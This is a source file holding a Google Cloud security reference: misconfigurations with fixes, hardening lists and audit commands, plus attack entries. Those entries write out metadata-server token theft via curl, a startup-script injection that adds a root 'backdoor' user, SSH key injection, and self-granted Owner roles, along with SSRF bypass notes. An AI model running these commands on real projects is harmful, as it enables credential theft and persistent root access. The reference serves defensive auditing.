// Copyright (c) 2026 SpartanKing18. All rights reserved.
// GCP Security Reference — Google Cloud Platform security services, attacks, and hardening.

export const GCP_SERVICES = [
  {
    service: "IAM",
    description: "Google Cloud Identity and Access Management. Uses a resource hierarchy (Organization > Folders > Projects) with policy inheritance.",
    misconfigurations: [
      { id: "GCP-IAM-001", title: "Primitive roles (Owner/Editor) used broadly", severity: "critical", description: "Primitive roles grant thousands of permissions. Editor alone grants write access to almost every GCP service.", remediation: "Replace with predefined or custom roles following least privilege." },
      { id: "GCP-IAM-002", title: "Service account key files in use", severity: "high", description: "Exported JSON key files are long-lived credentials that can be leaked via code repos, logs, or stolen laptops.", remediation: "Use Workload Identity Federation for external workloads. Use attached service accounts for GCP resources." },
      { id: "GCP-IAM-003", title: "allUsers or allAuthenticatedUsers in IAM bindings", severity: "critical", description: "Granting roles to allUsers (public) or allAuthenticatedUsers (any Google account) exposes resources to the world.", remediation: "Remove these principals. Use specific user/group/service account bindings." },
      { id: "GCP-IAM-004", title: "Service account impersonation not restricted", severity: "high", description: "Users with iam.serviceAccountTokenCreator can impersonate any service account, gaining its permissions.", remediation: "Restrict tokenCreator role to specific service accounts via IAM conditions." },
      { id: "GCP-IAM-005", title: "Domain-restricted sharing disabled", severity: "medium", description: "Without organization policy constraints, users can share GCP resources with any external Google account.", remediation: "Enable 'Domain restricted sharing' org policy to limit IAM bindings to approved domains." },
      { id: "GCP-IAM-006", title: "No organization policy constraints", severity: "high", description: "Missing org policies allow unrestricted resource creation, public IP assignment, and service enablement.", remediation: "Enable key org policies: disable service account key creation, restrict VM external IPs, disable serial port access." },
      { id: "GCP-IAM-007", title: "Service account keys not rotated", severity: "medium", description: "Service account keys older than 90 days increase the risk window if compromised.", remediation: "Rotate keys every 90 days. Better: eliminate keys entirely using Workload Identity." },
      { id: "GCP-IAM-008", title: "Default compute service account used", severity: "high", description: "The default compute service account (PROJECT_NUMBER-compute@developer.gserviceaccount.com) has Editor role by default.", remediation: "Create custom service accounts with minimal permissions. Disable the default compute SA." }
    ],
    attacks: [
      { name: "Metadata server credential theft", description: "From a compromised GCE instance or Cloud Function, query the metadata server to get OAuth tokens for the attached service account.", steps: ["curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "Use the access_token to call GCP APIs"] },
      { name: "Service account key theft", description: "Find exported service account JSON keys in code repos, CI/CD configs, or developer machines.", steps: ["Search repos for 'private_key_id' or 'client_email' patterns", "Use gcloud auth activate-service-account --key-file=KEY.json", "Access all resources the SA has permissions for"] },
      { name: "Privilege escalation via setIamPolicy", description: "A user with setIamPolicy on a resource can grant themselves any role on that resource.", steps: ["gcloud projects get-iam-policy PROJECT", "Add Owner role for attacker", "gcloud projects set-iam-policy PROJECT policy.json"] },
      { name: "Privilege escalation via service account impersonation", description: "Chain impersonation: user impersonates SA1 which can impersonate SA2 (admin).", steps: ["Find SA with high privileges", "Check if current identity has iam.serviceAccounts.getAccessToken on it", "Generate token: gcloud auth print-access-token --impersonate-service-account=SA@PROJECT.iam.gserviceaccount.com"] }
    ],
    hardening: [
      "Replace primitive roles with predefined or custom roles",
      "Eliminate service account key files — use Workload Identity",
      "Enable org policy: iam.disableServiceAccountKeyCreation",
      "Enable org policy: constraints/compute.vmExternalIpAccess",
      "Enable domain-restricted sharing",
      "Disable default compute service account",
      "Use IAM conditions for time-based or resource-based access",
      "Enable VPC Service Controls for sensitive projects",
      "Review IAM recommendations in Security Command Center",
      "Implement custom org policies for workload-specific constraints"
    ],
    auditCommands: [
      "gcloud projects get-iam-policy PROJECT --format=json",
      "gcloud iam service-accounts list --project PROJECT",
      "gcloud iam service-accounts keys list --iam-account SA@PROJECT.iam.gserviceaccount.com",
      "gcloud asset search-all-iam-policies --scope=organizations/ORG_ID --query='policy:allUsers OR policy:allAuthenticatedUsers'",
      "gcloud resource-manager org-policies list --organization ORG_ID"
    ]
  },
  {
    service: "Cloud Storage (GCS)",
    description: "Object storage service. Public bucket misconfigurations are the most common GCP security issue.",
    misconfigurations: [
      { id: "GCS-001", title: "Bucket publicly readable", severity: "critical", description: "IAM binding with allUsers as member and storage.objectViewer role exposes all objects to the public internet.", remediation: "Remove allUsers/allAuthenticatedUsers bindings. Enable uniform bucket-level access." },
      { id: "GCS-002", title: "Bucket publicly writable", severity: "critical", description: "Public write access allows anyone to upload malicious content or overwrite existing objects.", remediation: "Remove public write permissions immediately. Review all bucket IAM policies." },
      { id: "GCS-003", title: "Uniform bucket-level access not enabled", severity: "medium", description: "Mixed ACL and IAM access creates confusion and makes it hard to audit who has access to what.", remediation: "Enable uniform bucket-level access to use only IAM for access control." },
      { id: "GCS-004", title: "No object versioning", severity: "medium", description: "Without versioning, deleted or overwritten objects cannot be recovered.", remediation: "Enable object versioning for important buckets. Set lifecycle rules to manage old versions." },
      { id: "GCS-005", title: "No encryption with CMEK", severity: "medium", description: "Default Google-managed encryption keys cannot be audited or rotated on a custom schedule.", remediation: "Use Customer-Managed Encryption Keys (CMEK) via Cloud KMS for sensitive data." },
      { id: "GCS-006", title: "Access logs not enabled", severity: "medium", description: "Without access logging, bucket and object access cannot be audited.", remediation: "Enable Cloud Audit Logs for GCS data access. Use log sinks for long-term retention." }
    ],
    attacks: [
      { name: "Bucket enumeration", description: "Guess bucket names using common patterns and check for public access.", steps: ["gsutil ls gs://COMPANY-backup", "curl https://storage.googleapis.com/COMPANY-data/", "403 = exists, 404 = doesn't exist, 200 = public"] },
      { name: "Signed URL abuse", description: "Generate signed URLs for objects to bypass network controls and share data externally.", steps: ["gsutil signurl -d 7d key.json gs://bucket/secret.txt", "Share the signed URL — no Google credentials needed"] }
    ],
    auditCommands: [
      "gsutil ls",
      "gsutil iam get gs://BUCKET",
      "gsutil uniformbucketlevelaccess get gs://BUCKET",
      "gsutil versioning get gs://BUCKET",
      "gsutil logging get gs://BUCKET"
    ]
  },
  {
    service: "Compute Engine (GCE)",
    description: "Virtual machine instances. Security concerns include metadata service attacks, network exposure, and privilege escalation.",
    misconfigurations: [
      { id: "GCE-001", title: "External IP on instances", severity: "high", description: "Instances with external IPs are directly exposed to the internet.", remediation: "Use Cloud NAT for outbound. Use IAP tunnels for SSH/RDP. Apply org policy to restrict external IPs." },
      { id: "GCE-002", title: "Firewall rules allow 0.0.0.0/0", severity: "critical", description: "Firewall rules allowing all source IPs on SSH (22), RDP (3389), or other management ports.", remediation: "Restrict source ranges. Use IAP TCP forwarding (35.235.240.0/20) for management access." },
      { id: "GCE-003", title: "OS Login not enabled", severity: "medium", description: "Without OS Login, SSH access is managed via project/instance metadata SSH keys, which are harder to audit and rotate.", remediation: "Enable OS Login for centralized SSH access management via IAM." },
      { id: "GCE-004", title: "Serial port access enabled", severity: "medium", description: "Serial port access allows console login bypassing network security controls.", remediation: "Disable serial port access via metadata or org policy." },
      { id: "GCE-005", title: "Default service account with Editor role", severity: "high", description: "VMs using the default compute service account automatically get Editor-level access to the project.", remediation: "Create minimal custom service accounts for each workload." },
      { id: "GCE-006", title: "Shielded VM not enabled", severity: "medium", description: "Without Shielded VM, instances are vulnerable to rootkits and bootkits that persist across reboots.", remediation: "Enable Shielded VM with Secure Boot, vTPM, and Integrity Monitoring." },
      { id: "GCE-007", title: "Disk encryption with default keys", severity: "low", description: "Default Google-managed keys don't allow custom rotation or access control policies.", remediation: "Use CMEK or CSEK for sensitive workloads." },
      { id: "GCE-008", title: "Project-wide SSH keys", severity: "high", description: "SSH keys added at the project level grant access to all instances in the project.", remediation: "Use instance-level SSH keys or OS Login. Block project-wide keys on sensitive instances." }
    ],
    attacks: [
      { name: "Metadata server token theft", description: "Query the metadata server from a compromised instance to get service account tokens.", steps: ["curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'", "curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys'"] },
      { name: "Startup script injection", description: "An attacker with compute.instances.setMetadata can inject a startup script that executes as root on next boot.", steps: ["gcloud compute instances add-metadata INSTANCE --metadata=startup-script='#!/bin/bash\\nuseradd -o -u 0 backdoor'", "Restart the instance", "Login as backdoor user with root privileges"] },
      { name: "SSH key injection via metadata", description: "Add an SSH public key to instance or project metadata to gain SSH access.", steps: ["gcloud compute project-info add-metadata --metadata=ssh-keys='attacker:ssh-rsa AAAA...'", "SSH to any instance in the project"] }
    ],
    hardening: [
      "Use Cloud NAT and IAP instead of external IPs",
      "Enable OS Login for SSH access management",
      "Disable serial port access",
      "Use custom service accounts (not default)",
      "Enable Shielded VM features",
      "Block project-wide SSH keys on sensitive instances",
      "Use CMEK for disk encryption",
      "Apply org policy: compute.vmExternalIpAccess",
      "Enable VPC Flow Logs for network monitoring",
      "Use Confidential VMs for sensitive workloads"
    ],
    auditCommands: [
      "gcloud compute instances list --format='table(name,zone,status,networkInterfaces[0].accessConfigs[0].natIP:label=EXTERNAL_IP)'",
      "gcloud compute firewall-rules list --format='table(name,direction,sourceRanges,allowed)'",
      "gcloud compute instances describe INSTANCE --zone ZONE --format='value(serviceAccounts[0].email)'"
    ]
  },
  {
    service: "GKE (Google Kubernetes Engine)",
    description: "Managed Kubernetes. Security concerns include RBAC, pod security, network policies, and workload identity.",
    misconfigurations: [
      { id: "GKE-001", title: "Legacy ABAC enabled", severity: "critical", description: "Attribute-Based Access Control is deprecated and overly permissive. RBAC should be the sole authorization mechanism.", remediation: "Disable legacy ABAC. Use RBAC exclusively." },
      { id: "GKE-002", title: "Workload Identity not enabled", severity: "high", description: "Without Workload Identity, pods use the node's service account or mounted key files for GCP API access.", remediation: "Enable Workload Identity at the cluster level and configure per-namespace service accounts." },
      { id: "GKE-003", title: "Public cluster endpoint", severity: "high", description: "The Kubernetes API server is accessible from the public internet.", remediation: "Enable private cluster with authorized networks. Use Cloud NAT for egress." },
      { id: "GKE-004", title: "No network policies", severity: "high", description: "Without network policies, any pod can communicate with any other pod in the cluster.", remediation: "Enable network policy enforcement (Calico or Dataplane V2). Apply default-deny policies per namespace." },
      { id: "GKE-005", title: "Pods running as root", severity: "high", description: "Containers running as root can escape to the host if a container escape vulnerability exists.", remediation: "Enforce Pod Security Standards (restricted). Use securityContext: runAsNonRoot: true." },
      { id: "GKE-006", title: "No Binary Authorization", severity: "medium", description: "Without Binary Authorization, any container image can be deployed to the cluster.", remediation: "Enable Binary Authorization with attestation policies to only allow signed, trusted images." },
      { id: "GKE-007", title: "Metadata server not protected", severity: "high", description: "Pods can query the GCE metadata server to steal node-level service account tokens.", remediation: "Enable Workload Identity (blocks metadata server access from pods). Or enable metadata concealment." },
      { id: "GKE-008", title: "Auto-upgrade disabled", severity: "medium", description: "Nodes and control plane not automatically upgraded miss security patches.", remediation: "Enable auto-upgrade for nodes. GKE auto-upgrades the control plane by default." }
    ],
    auditCommands: [
      "gcloud container clusters list --format='table(name,location,currentMasterVersion,status)'",
      "gcloud container clusters describe CLUSTER --zone ZONE --format='value(privateClusterConfig,workloadIdentityConfig,networkPolicy,binaryAuthorization)'",
      "kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: runAsUser={.spec.securityContext.runAsUser}\\n{end}'"
    ]
  },
  {
    service: "Security Command Center",
    description: "GCP's native security and risk management platform. Provides asset inventory, vulnerability scanning, threat detection, and compliance monitoring.",
    key_features: [
      "Asset inventory across all GCP resources",
      "Security Health Analytics — automated misconfiguration detection",
      "Web Security Scanner — OWASP Top 10 scanning for App Engine and GCE web apps",
      "Event Threat Detection — log-based threat detection (similar to GuardDuty)",
      "Container Threat Detection — runtime threat detection for GKE",
      "Virtual Machine Threat Detection — agentless malware and cryptomining detection",
      "Attack path simulation — visualize how an attacker could reach high-value resources",
      "Compliance reporting — CIS benchmarks, PCI DSS, NIST 800-53"
    ],
    auditCommands: [
      "gcloud scc findings list ORGANIZATION_ID --source=SECURITY_HEALTH_ANALYTICS --filter='state=\"ACTIVE\" AND severity=\"CRITICAL\"'",
      "gcloud scc assets list ORGANIZATION_ID --filter='securityCenterProperties.resourceType=\"google.compute.Instance\"'"
    ]
  },
  {
    service: "Cloud Functions",
    description: "Serverless compute. Security concerns include overprivileged service accounts, event injection, and dependency vulnerabilities.",
    misconfigurations: [
      { id: "CF-001", title: "Function publicly invokable", severity: "critical", description: "IAM binding with allUsers and roles/cloudfunctions.invoker allows anyone to trigger the function.", remediation: "Remove allUsers binding. Use IAM to restrict invocation to specific identities." },
      { id: "CF-002", title: "Default service account used", severity: "high", description: "Functions using the default App Engine or Compute Engine service account have excessive permissions.", remediation: "Create a dedicated service account with minimal permissions for each function." },
      { id: "CF-003", title: "Environment variables contain secrets", severity: "critical", description: "Secrets in environment variables are visible to anyone with cloudfunctions.functions.get permission.", remediation: "Use Secret Manager. Reference secrets in the function configuration." },
      { id: "CF-004", title: "No VPC connector", severity: "medium", description: "Functions without VPC connectors can only access public endpoints, not private resources.", remediation: "Configure a Serverless VPC Access connector for functions that need private network access." },
      { id: "CF-005", title: "Ingress not restricted", severity: "medium", description: "Functions accept traffic from any source instead of only internal traffic or Cloud Load Balancing.", remediation: "Set ingress to 'internal-only' or 'internal-and-gclb' for functions not needing public access." }
    ],
    auditCommands: [
      "gcloud functions list --format='table(name,runtime,serviceAccountEmail,ingressSettings)'",
      "gcloud functions get-iam-policy FUNCTION_NAME --region REGION",
      "gcloud functions describe FUNCTION_NAME --region REGION --format='value(environmentVariables)'"
    ]
  }
];

export const GCP_METADATA_SERVICE = {
  description: "GCP metadata server at metadata.google.internal (169.254.169.254) requires the Metadata-Flavor: Google header, which mitigates basic SSRF but not all vectors.",
  endpoints: [
    { path: "/computeMetadata/v1/instance/service-accounts/default/token", description: "OAuth2 access token for the instance's service account" },
    { path: "/computeMetadata/v1/instance/service-accounts/default/email", description: "Service account email" },
    { path: "/computeMetadata/v1/instance/service-accounts/default/scopes", description: "OAuth scopes granted to the service account" },
    { path: "/computeMetadata/v1/project/project-id", description: "GCP project ID" },
    { path: "/computeMetadata/v1/project/numeric-project-id", description: "Numeric project ID" },
    { path: "/computeMetadata/v1/project/attributes/ssh-keys", description: "Project-wide SSH public keys" },
    { path: "/computeMetadata/v1/instance/attributes/startup-script", description: "Instance startup script" },
    { path: "/computeMetadata/v1/instance/hostname", description: "Instance hostname" },
    { path: "/computeMetadata/v1/instance/zone", description: "Instance zone" },
    { path: "/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip", description: "External IP address" },
    { path: "/computeMetadata/v1/instance/attributes/kube-env", description: "Kubernetes environment variables (GKE nodes)" }
  ],
  required_header: "Metadata-Flavor: Google",
  bypass_techniques: [
    { technique: "DNS rebinding", description: "DNS record initially resolves to attacker's server, then changes to 169.254.169.254 after the initial origin check.", mitigation: "Use metadata concealment or Workload Identity." },
    { technique: "SSRF with header injection", description: "If the SSRF vulnerability allows setting custom headers, the attacker can add the required Metadata-Flavor header.", mitigation: "Validate and sanitize all user-controlled URLs. Block metadata IP ranges." },
    { technique: "From GKE pod", description: "Pods can reach the metadata server unless Workload Identity or metadata concealment is enabled.", mitigation: "Enable Workload Identity at the cluster level." }
  ]
};

export const GCP_TOOLS = [
  { name: "ScoutSuite", description: "Multi-cloud security auditing tool with GCP support. Generates HTML reports with findings.", usage: "scout gcp --user-account" },
  { name: "Prowler", description: "GCP security assessment against CIS benchmarks and custom checks.", usage: "prowler gcp --credentials-file creds.json" },
  { name: "GCPBucketBrute", description: "Enumerate GCS buckets and test for public access using various permutations.", usage: "python3 gcpbucketbrute.py -k keyword -w subdomains.txt" },
  { name: "gcp_enum", description: "Enumerate GCP resources from a compromised service account or user credential.", usage: "python3 gcp_enum.py -k key.json" },
  { name: "Hayat", description: "GCP Red Team tool for privilege escalation, persistence, and credential theft.", usage: "python3 hayat.py --project PROJECT_ID" },
  { name: "gcloud CLI", description: "Official GCP command-line tool. Essential for enumeration and exploitation.", usage: "gcloud auth activate-service-account --key-file=KEY.json && gcloud projects list" }
];
